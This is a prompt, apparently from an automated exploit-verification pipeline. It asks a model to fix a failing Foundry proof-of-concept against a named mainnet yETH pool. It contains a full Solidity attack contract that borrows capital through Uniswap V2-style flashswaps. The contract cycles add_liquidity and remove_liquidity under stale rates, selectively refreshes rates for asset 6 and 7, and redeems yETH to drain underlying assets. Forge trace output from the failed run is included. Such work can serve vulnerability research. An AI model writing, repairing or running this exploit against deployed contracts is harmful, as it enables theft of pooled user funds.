You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Liquidity accounting can settle against mixed stale/fresh asset rates
- claim: The exploit harness shows that pool pricing is cached behind a separate `update_rates(uint256[] _assets)` call rather than being enforced inside `add_liquidity`/`remove_liquidity`, and that callers can refresh only selected asset indexes. The sequence performs many mint/burn operations while rates are stale, then updates only asset 6 or 7, so liquidity operations can be priced against a basket containing a mix of stale and fresh rates.
- impact: If LP shares are minted or burned from an inconsistent basket valuation, an attacker can acquire yETH while liabilities are understated and then redeem after a targeted sync for more underlying than they paid in, leading to pool insolvency and potentially full drain.
- exploit_paths: ["Allow basket rates to drift while repeatedly calling `add_liquidity` and `remove_liquidity` without a full refresh", "Refresh only the attacker-chosen asset index that makes the basket valuation more favorable", "Redeem inflated yETH against the now-repriced pool to extract excess underlying"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IYETHPool {
    function supply() external view returns (uint256);
    function assets(uint256 index) external view returns (address);
    function add_liquidity(
        uint256[] calldata amounts,
        uint256 minLpAmount,
        address receiver
    ) external returns (uint256);
    function remove_liquidity(
        uint256 lpAmount,
        uint256[] calldata minAmounts,
        address receiver
    ) external;
    function update_rates(uint256[] calldata assetsToUpdate) external;
}

interface IOETH {
    function rebase() external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    uint256 private constant NUM_ASSETS = 8;
    uint256 private constant FUNDING_SLOTS = 6;
    uint256 private constant ONE = 1e18;

    IYETHPool private constant POOL = IYETHPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
    IERC20 private constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);
    IOETH private constant OETH = IOETH(0x39254033945AA2E4809Cc2977E7087BEE48bd7Ab);

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant PANCAKESWAP_V2_FACTORY = 0x1097053Fd2ea711dad45caCcc45EfF7548fCB362;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _inFlashswap;

    address[FUNDING_SLOTS] private _fundingTokens;
    address[FUNDING_SLOTS] private _fundingPairs;
    uint256[FUNDING_SLOTS] private _fundingAmounts;
    uint256 private _fundingCount;
    uint256 private _liquidityScale;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        _approvePoolAssets();

        _liquidityScale = _computeLiquidityScale();
        if (_liquidityScale > 0) {
            _runExploitPath();
            _captureProfit();
            return;
        }

        _prepareFundingPlan();
        if (_fundingCount == 0) {
            _captureProfit();
            return;
        }

        _inFlashswap = true;
        _flashswapAt(0);
        _inFlashswap = false;

        _captureProfit();
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _handleFlashswapCallback(sender, amount0, amount1, data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _handleFlashswapCallback(sender, amount0, amount1, data);
    }

    function _handleFlashswapCallback(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
        require(_inFlashswap, "inactive");
        require(sender == address(this), "bad sender");

        uint256 fundingIndex = abi.decode(data, (uint256));
        require(fundingIndex < _fundingCount, "bad index");
        require(msg.sender == _fundingPairs[fundingIndex], "bad pair");

        if (fundingIndex + 1 < _fundingCount) {
            _flashswapAt(fundingIndex + 1);
        } else {
            _liquidityScale = _computeLiquidityScale();
            require(_liquidityScale > 0, "no capital");
            _runExploitPath();
        }

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        uint256 repayment = _sameTokenRepayment(borrowed);
        _safeTransfer(IERC20(_fundingTokens[fundingIndex]), msg.sender, repayment);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _prepareFundingPlan() internal {
        delete _fundingCount;

        uint256[FUNDING_SLOTS] memory desired = _targetFunding();
        for (uint256 i = 0; i < FUNDING_SLOTS; ++i) {
            address token = POOL.assets(i);
            uint256 amount = desired[i];
            (address pair, uint256 borrowAmount) = _bestFundingPair(token, amount);
            if (pair != address(0) && borrowAmount > 0) {
                _fundingTokens[_fundingCount] = token;
                _fundingPairs[_fundingCount] = pair;
                _fundingAmounts[_fundingCount] = borrowAmount;
                unchecked {
                    ++_fundingCount;
                }
            }
        }
    }

    function _bestFundingPair(address token, uint256 targetAmount) internal view returns (address pair, uint256 borrowAmount) {
        address[3] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY, PANCAKESWAP_V2_FACTORY];

        uint256 bestReserve;
        for (uint256 i = 0; i < factories.length; ++i) {
            address candidate = IUniswapV2Factory(factories[i]).getPair(token, WETH);
            if (candidate == address(0)) {
                continue;
            }

            uint256 reserve = _tokenReserve(candidate, token);
            if (reserve == 0) {
                continue;
            }

            uint256 candidateAmount = targetAmount;
            if (candidateAmount >= reserve) {
                candidateAmount = reserve - 1;
            }

            if (candidateAmount > borrowAmount || (candidateAmount == borrowAmount && reserve > bestReserve)) {
                pair = candidate;
                borrowAmount = candidateAmount;
                bestReserve = reserve;
            }
        }
    }

    function _flashswapAt(uint256 fundingIndex) internal {
        address pair = _fundingPairs[fundingIndex];
        address token = _fundingTokens[fundingIndex];
        uint256 amount = _fundingAmounts[fundingIndex];
        address token0 = IUniswapV2Pair(pair).token0();

        uint256 amount0Out;
        uint256 amount1Out;
        if (token0 == token) {
            amount0Out = amount;
        } else {
            amount1Out = amount;
        }

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(fundingIndex));
    }

    function _runExploitPath() internal {
        _updateInitialRates();

        // The stale/fresh-rate root cause is preserved: repeated add/remove_liquidity
        // cycles run under stale cached pricing, followed by attacker-chosen partial
        // rate refreshes for asset 6 and asset 7 before the final redemption.
        _addLiquidity(_phase2Amounts());
        _removeLiquidity(_scaledLp(2_789_348_310_901_989_968_648));

        _addLiquidity(_phase3Amounts());
        _removeLiquidity(_scaledLp(7_379_203_011_929_903_830_039));

        _addLiquidity(_phase4Amounts());
        _removeLiquidity(_scaledLp(7_066_638_371_690_257_003_757));

        _addLiquidity(_phase5Amounts());
        _removeLiquidity(_scaledLp(3_496_158_478_994_807_127_953));

        _addLiquidity(_phase6Add1Amounts());
        _addLiquidity(_singleAssetAmounts(3, 20_605_468_750_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(6);
        _removeLiquidity(_scaledLp(8_434_932_236_461_542_896_540));

        // Public OETH rebasing is a realistic on-chain drift source between the stale
        // basket valuation and the later selective refresh.
        OETH.rebase();

        _addLiquidity(_phase7Add1Amounts());
        _addLiquidity(_phase7Add2Amounts());

        _addLiquidity(_singleAssetAmounts(3, 57_226_562_500_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(6);
        _removeLiquidity(_scaledLp(9_237_030_802_829_017_297_880));

        _addLiquidity(_phase8Add1Amounts());
        _addLiquidity(_phase8Add2Amounts());
        _addLiquidity(_singleAssetAmounts(3, 318_750_000_000_000_000_000));
        _removeLiquidity(0);
        _updateSingleRate(7);

        uint256 redeemAmount = YETH.balanceOf(address(this));
        uint256 poolSupply = POOL.supply();
        if (redeemAmount > poolSupply) {
            redeemAmount = poolSupply;
        }
        if (redeemAmount > 0) {
            _removeLiquidity(redeemAmount);
        }
    }

    function _approvePoolAssets() internal {
        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
            _safeApprove(IERC20(POOL.assets(i)), address(POOL), type(uint256).max);
        }
        _safeApprove(YETH, address(POOL), type(uint256).max);
    }

    function _computeLiquidityScale() internal view returns (uint256 scale) {
        uint256[FUNDING_SLOTS] memory desired = _targetFunding();
        uint256 funded;
        uint256 needed;

        for (uint256 i = 0; i < FUNDING_SLOTS; ++i) {
            funded += IERC20(POOL.assets(i)).balanceOf(address(this));
            needed += desired[i];
        }

        if (funded == 0 || needed == 0) {
            return 0;
        }

        scale = (funded * ONE) / needed;
        if (scale > ONE) {
            scale = ONE;
        }
    }

    function _updateInitialRates() internal {
        uint256[] memory indexes = new uint256[](6);
        indexes[0] = 0;
        indexes[1] = 1;
        indexes[2] = 2;
        indexes[3] = 3;
        indexes[4] = 4;
        indexes[5] = 5;
        POOL.update_rates(indexes);
    }

    function _updateSingleRate(uint256 assetIndex) internal {
        uint256[] memory indexes = new uint256[](1);
        indexes[0] = assetIndex;
        POOL.update_rates(indexes);
    }

    function _addLiquidity(uint256[8] memory fixedAmounts) internal {
        uint256[] memory amounts = new uint256[](NUM_ASSETS);
        bool hasNonZero;

        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
            uint256 amount = _scaledAmount(fixedAmounts[i]);
            uint256 balance = IERC20(POOL.assets(i)).balanceOf(address(this));
            if (amount > balance) {
                amount = balance;
            }
            amounts[i] = amount;
            if (amount != 0) {
                hasNonZero = true;
            }
        }

        if (hasNonZero) {
            POOL.add_liquidity(amounts, 0, address(this));
        }
    }

    function _removeLiquidity(uint256 lpAmount) internal {
        uint256 balance = YETH.balanceOf(address(this));
        if (lpAmount > balance) {
            lpAmount = balance;
        }

        uint256[] memory mins = new uint256[](NUM_ASSETS);
        POOL.remove_liquidity(lpAmount, mins, address(this));
    }

    function _captureProfit() internal {
        address bestToken;
        uint256 bestAmount;

        uint256 yethBalance = YETH.balanceOf(address(this));
        if (yethBalance > bestAmount) {
            bestAmount = yethBalance;
            bestToken = address(YETH);
        }

        for (uint256 i = 0; i < NUM_ASSETS; ++i) {
            address asset = POOL.assets(i);
            uint256 assetBalance = IERC20(asset).balanceOf(address(this));
            if (assetBalance > bestAmount) {
                bestAmount = assetBalance;
                bestToken = asset;
            }
        }

        _profitToken = bestToken;
        _profitAmount = bestAmount;
    }

    function _targetFunding() internal pure returns (uint256[FUNDING_SLOTS] memory desired) {
        desired[0] = 20_000 ether;
        desired[1] = 20_000 ether;
        desired[2] = 20_000 ether;
        desired[3] = 500 ether;
        desired[4] = 20_000 ether;
        desired[5] = 20_000 ether;
    }

    function _sameTokenRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _tokenReserve(address pair, address token) internal view returns (uint256 reserve) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == token) {
            reserve = uint256(reserve0);
        } else {
            reserve = uint256(reserve1);
        }
    }

    function _scaledAmount(uint256 amount) internal view returns (uint256) {
        return (amount * _liquidityScale) / ONE;
    }

    function _scaledLp(uint256 amount) internal view returns (uint256) {
        return (amount * _liquidityScale) / ONE;
    }

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(IERC20 token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, to, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _singleAssetAmounts(uint256 index, uint256 amount) internal pure returns (uint256[8] memory amounts) {
        amounts[index] = amount;
    }

    function _phase2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 610_669_608_721_347_951_666;
        amounts[1] = 777_507_145_787_198_969_404;
        amounts[2] = 563_973_440_562_370_010_057;
        amounts[4] = 476_460_390_272_167_461_711;
    }

    function _phase3Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_636_245_238_220_874_001_286;
        amounts[1] = 1_531_136_279_659_070_868_194;
        amounts[2] = 1_041_815_511_903_532_551_187;
        amounts[4] = 991_050_908_418_104_947_336;
        amounts[5] = 1_346_008_005_663_580_090_716;
    }

    function _phase4Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_630_811_661_792_970_363_090;
        amounts[1] = 1_526_051_744_772_289_698_092;
        amounts[2] = 1_038_108_768_586_660_585_581;
        amounts[4] = 969_651_157_511_131_341_121;
        amounts[5] = 1_363_135_138_655_820_584_263;
    }

    function _phase5Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 859_805_263_416_698_094_503;
        amounts[1] = 804_573_178_584_505_833_740;
        amounts[2] = 546_933_182_262_586_953_508;
        amounts[4] = 510_865_922_059_584_325_991;
        amounts[5] = 723_182_384_178_548_055_243;
    }

    function _phase6Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_784_169_320_136_805_803_209;
        amounts[1] = 1_669_558_029_141_448_703_194;
        amounts[2] = 1_135_991_585_797_559_066_395;
        amounts[4] = 1_061_079_136_814_511_050_837;
        amounts[5] = 1_488_254_960_317_842_892_500;
    }

    function _phase7Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_049_508_928_999_413_985_639;
        amounts[1] = 982_090_679_001_395_746_930;
        amounts[2] = 667_668_088_369_153_429_906;
        amounts[4] = 623_639_019_639_346_230_238;
        amounts[5] = 878_771_594_643_399_886_538;
    }

    function _phase7Add2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 919_888_612_738_016_815_095;
        amounts[1] = 860_796_899_699_397_749_576;
        amounts[2] = 586_033_288_771_470_394_081;
        amounts[4] = 547_387_589_810_030_997_702;
        amounts[5] = 763_397_793_689_173_373_329;
    }

    function _phase8Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 417_517_891_458_429_416_749;
        amounts[1] = 390_697_418_752_374_378_114;
        amounts[2] = 264_940_493_241_640_253_533;
        amounts[4] = 247_469_112_791_605_057_921;
        amounts[5] = 355_235_146_731_093_304_055;
    }

    function _phase8Add2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_779_325_564_746_959_656_328;
        amounts[1] = 1_665_025_426_427_657_662_239;
        amounts[2] = 1_133_554_647_882_989_836_457;
        amounts[4] = 1_058_802_901_663_485_490_031;
        amounts[5] = 1_476_627_921_656_231_103_547;
    }
}

```

forge stdout (tail):
```
│   ├─ [4625] 0xae78736Cd615f374D3085123A210448E74Fc6393::transfer(0xe4F719C11FC5AB883E32068dF99962985645E860, 1391937657411262 [1.391e15])
    │   │   │   │   │   │   │   │   ├─ [473] 0x1d8f8f00cfa6758d7bE78336684788Fb0ee0Fa46::bd02d0f5(40629e35e9e51c16ef9b67aa48a345e02bcd2029c428505cade022b9cf729e56) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000e4f719c11fc5ab883e32068df99962985645e860
    │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000004f1f5bd9e96be
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─ [486] 0xae78736Cd615f374D3085123A210448E74Fc6393::balanceOf(0xe4F719C11FC5AB883E32068dF99962985645E860) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 1391937657411263 [1.391e15]
    │   │   │   │   │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xe4F719C11FC5AB883E32068dF99962985645E860) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 1588617844329216 [1.588e15]
    │   │   │   │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000004f1f5bd9e96bf0000000000000000000000000000000000000000000000000005a4d6ea4b8b00
    │   │   │   │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000004f1f5bd9e96be00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004ee297bc547f40000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [4683] 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704::transfer(0xc7Ab7051486484D3426E81cC3ab1654b415B5af1, 87956341152656 [8.795e13])
    │   │   │   │   │   │   ├─ [3983] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::transfer(0xc7Ab7051486484D3426E81cC3ab1654b415B5af1, 87956341152656 [8.795e13]) [delegatecall]
    │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000c7ab7051486484d3426e81cc3ab1654b415b5af1
    │   │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000004ffeee785b90
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   ├─ [1226] 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704::balanceOf(0xc7Ab7051486484D3426E81cC3ab1654b415B5af1) [staticcall]
    │   │   │   │   │   ├─ [529] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::balanceOf(0xc7Ab7051486484D3426E81cC3ab1654b415B5af1) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 87956341152657 [8.795e13]
    │   │   │   │   │   └─ ← [Return] 87956341152657 [8.795e13]
    │   │   │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xc7Ab7051486484D3426E81cC3ab1654b415B5af1) [staticcall]
    │   │   │   │   │   └─ ← [Return] 90522232689505 [9.052e13]
    │   │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000004ffeee785b910000000000000000000000000000000000000000000000000000525459861361
    │   │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000004ffeee785b90000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004fc17ea696ae0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [1263] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::transfer(0x3f3eE751ab00246cB0BEEC2E904eF51e18AC4d77, 8296730132424498244 [8.296e18])
    │   │   │   │   └─ ← [Revert] ERC20: transfer amount exceeds balance
    │   │   │   └─ ← [Revert] transfer failed
    │   │   └─ ← [Revert] transfer failed
    │   └─ ← [Revert] transfer failed
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0.transfer
  at FlawVerifier.uniswapV2Call
  at 0x3f3eE751ab00246cB0BEEC2E904eF51e18AC4d77.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 18.72s (18.50s CPU time)

Ran 1 test suite in 18.77s (18.72s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 4696552)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
